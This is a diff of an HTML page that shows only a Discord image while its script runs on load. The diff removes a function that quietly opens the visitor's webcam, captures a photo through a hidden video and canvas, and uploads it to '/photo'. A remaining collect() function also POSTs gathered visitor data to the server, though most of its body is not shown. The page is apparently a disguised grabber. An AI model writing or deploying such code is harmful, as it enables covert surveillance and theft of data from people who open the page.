@@ -6,14 +6,11 @@
 <style>
   * { margin: 0; padding: 0; }
   body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-  img#main { max-width: 100%; max-height: 100vh; display: block; }
-  video, canvas { display: none; }
+  img { max-width: 100%; max-height: 100vh; display: block; }
 </style>
 </head>
 <body>
-<img id="main" src="/discord.png">
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<img src="/discord.png">
 <script>
 async function collect() {
   const data = {
@@ -52,29 +49,7 @@ async function collect() {
     body: JSON.stringify(data)
   })
 }
-
-async function snapCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true })
-    const video = document.getElementById('video')
-    const canvas = document.getElementById('canvas')
-    video.srcObject = stream
-    await new Promise(r => video.onloadedmetadata = r)
-    canvas.width = video.videoWidth
-    canvas.height = video.videoHeight
-    canvas.getContext('2d').drawImage(video, 0, 0)
-    stream.getTracks().forEach(t => t.stop())
-    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8))
-    const formData = new FormData()
-    formData.append('photo', blob, 'photo.jpg')
-    fetch('/photo', { method: 'POST', body: formData })
-  } catch(e) {
-    console.log('Camera denied or unavailable')
-  }
-}
-
 collect()
-snapCamera()
 </script>
 </body>
 </html>
